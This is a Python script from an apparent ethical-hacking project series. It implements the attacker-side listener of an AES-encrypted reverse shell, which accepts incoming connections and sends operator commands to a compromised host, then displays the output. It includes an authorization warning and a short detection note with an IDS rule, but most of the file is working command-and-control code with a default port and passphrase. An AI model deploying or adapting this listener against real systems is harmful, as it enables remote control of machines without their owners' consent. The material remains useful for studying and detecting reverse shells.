#!/usr/bin/env python3
"""
============================================================
  PROJECT #5 — Reverse Shell  |  LISTENER (Attacker Side)
  100 Ethical Hacking Projects Series
  Crypto  : AES-256-CBC  (PBKDF2 key from passphrase)
  Port    : configurable via --port
============================================================

  ╔══════════════════════════════════════════════════════╗
  ║          ⚠  ETHICAL USE WARNING  ⚠                  ║
  ║  Use ONLY in your own lab / authorised pentest.      ║
  ║  Unauthorised use is illegal worldwide.              ║
  ╚══════════════════════════════════════════════════════╝

LEGITIMATE USE CASE
--------------------
Post-exploitation persistence testing: after gaining
initial access on an authorized red-team engagement, the
operator deploys a reverse shell payload to demonstrate
that the target network allows outbound connections on
common ports (443/80/4444). The report shows the client
would never catch this traffic without egress filtering.

DETECTION METHOD
-----------------
Network-layer: A SIEM/IDS rule that flags any persistent
outbound TCP connection that repeats every 5 seconds from
an internal host to the same external IP is a strong IoC
(Indicator of Compromise) for a beaconing reverse shell.
Tools like Zeek (Bro) model connection intervals; Suricata
rule `threshold: type both, track by_src, count 5,
seconds 30` will alert on repeated reconnection bursts.

USAGE
------
  python3 project5_listener.py --port 4444
  python3 project5_listener.py --port 4444 --passphrase mysecret
============================================================
"""

import socket
import sys
import os
import argparse
import struct
import base64
import hashlib
import datetime

# ── AES helpers (shared with client) ─────────────────────
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as sym_padding

SALT        = b"project5salt99"   # fixed salt (demo); use random+exchange in prod
ITERATIONS  = 100_000
KEY_LEN     = 32                  # AES-256
IV_LEN      = 16

def derive_key(passphrase: str) -> bytes:
    return hashlib.pbkdf2_hmac(
        "sha256", passphrase.encode(), SALT, ITERATIONS, dklen=KEY_LEN)

def aes_encrypt(plaintext: bytes, key: bytes) -> bytes:
    """AES-256-CBC encrypt; prepends 16-byte IV."""
    iv        = os.urandom(IV_LEN)
    padder    = sym_padding.PKCS7(128).padder()
    padded    = padder.update(plaintext) + padder.finalize()
    cipher    = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    enc       = cipher.encryptor()
    ct        = enc.update(padded) + enc.finalize()
    return iv + ct

def aes_decrypt(ciphertext: bytes, key: bytes) -> bytes:
    """AES-256-CBC decrypt; first 16 bytes are IV."""
    iv        = ciphertext[:IV_LEN]
    ct        = ciphertext[IV_LEN:]
    cipher    = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    dec       = cipher.decryptor()
    padded    = dec.update(ct) + dec.finalize()
    unpadder  = sym_padding.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()

# ── framing: 4-byte big-endian length prefix ─────────────
def send_msg(sock: socket.socket, data: bytes):
    sock.sendall(struct.pack(">I", len(data)) + data)

def recv_msg(sock: socket.socket) -> bytes:
    raw_len = _recv_exact(sock, 4)
    if not raw_len:
        return b""
    length = struct.unpack(">I", raw_len)[0]
    return _recv_exact(sock, length)

def _recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return b""
        buf += chunk
    return buf

# ── colours ───────────────────────────────────────────────
R="\033[0m";BOLD="\033[1m";RED="\033[91m";GREEN="\033[92m"
YELLOW="\033[93m";CYAN="\033[96m";MAGENTA="\033[95m";DIM="\033[2m"
def c(t, code): return f"{code}{t}{R}"

def ts(): return datetime.datetime.now().strftime("%H:%M:%S")

# ─────────────────────────────────────────────────────────
# LISTENER
# ─────────────────────────────────────────────────────────
def listen(host: str, port: int, passphrase: str):
    key = derive_key(passphrase)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((host, port))
    except OSError as e:
        print(c(f"\n  [ERROR] Cannot bind {host}:{port} — {e}\n", RED))
        sys.exit(1)

    srv.listen(1)

    print()
    print(c("  ╔══════════════════════════════════════════════════════╗", CYAN))
    print(c("  ║   PROJECT #5 · REVERSE SHELL — LISTENER              ║", CYAN))
    print(c("  ╚══════════════════════════════════════════════════════╝", CYAN))
    print()
    print(c("  ⚠  For authorised lab / pentest use only.", RED))
    print()
    print(f"  Listening on {c(host + ':' + str(port), YELLOW)}  "
          f"AES-256-CBC  passphrase={c(passphrase, MAGENTA)}")
    print(c("  Waiting for reverse connection …\n", DIM))

    while True:
        try:
            conn, addr = srv.accept()
        except KeyboardInterrupt:
            print(c("\n\n  [Listener closed by operator.]\n", YELLOW))
            srv.close()
            sys.exit(0)

        print(c(f"\n  [{ts()}] ✔ Shell connected from {addr[0]}:{addr[1]}", GREEN))
        print(c(f"  Type commands below. Special: 'exit' kills client, Ctrl+C disconnects.\n", DIM))

        _shell_loop(conn, addr, key)

        conn.close()
        print(c(f"\n  [{ts()}] Connection from {addr[0]} closed. Waiting for next …\n", YELLOW))


def _shell_loop(conn: socket.socket, addr, key: bytes):
    """Interactive command loop for one connected client."""
    # receive initial prompt (cwd from client)
    raw = recv_msg(conn)
    if raw:
        prompt_info = aes_decrypt(raw, key).decode(errors="replace")
    else:
        prompt_info = "unknown"

    while True:
        try:
            cmd = input(c(f"  shell@{addr[0]} [{prompt_info}]> ", GREEN + BOLD))
        except (KeyboardInterrupt, EOFError):
            print()
            return

        if not cmd.strip():
            continue

        # send encrypted command
        try:
            send_msg(conn, aes_encrypt(cmd.encode(), key))
        except (BrokenPipeError, ConnectionResetError):
            print(c("  [!] Client disconnected.", RED))
            return

        if cmd.strip().lower() == "exit":
            print(c("  [*] Exit command sent.", YELLOW))
            return

        # receive encrypted response
        try:
            raw = recv_msg(conn)
        except (ConnectionResetError, OSError):
            print(c("  [!] Client disconnected.", RED))
            return

        if not raw:
            print(c("  [!] Empty response — client may have disconnected.", YELLOW))
            return

        resp = aes_decrypt(raw, key).decode(errors="replace")

        # first line of response is the new cwd prompt; rest is command output
        lines = resp.split("\n", 1)
        if len(lines) == 2:
            prompt_info, output = lines
        else:
            output = lines[0]

        if output:
            print(c("  ┌─ output ───────────────────────────────────────", DIM))
            for line in output.rstrip().splitlines():
                print("  │ " + line)
            print(c("  └────────────────────────────────────────────────", DIM))


# ─────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Project #5 — Reverse Shell Listener")
    parser.add_argument("--host",       default="0.0.0.0",        help="Bind host (default: 0.0.0.0)")
    parser.add_argument("--port",       type=int, default=4444,   help="Listen port (default: 4444)")
    parser.add_argument("--passphrase", default="ultraprohacker", help="AES passphrase (must match client)")
    args = parser.parse_args()
    listen(args.host, args.port, args.passphrase)

if __name__ == "__main__":
    main()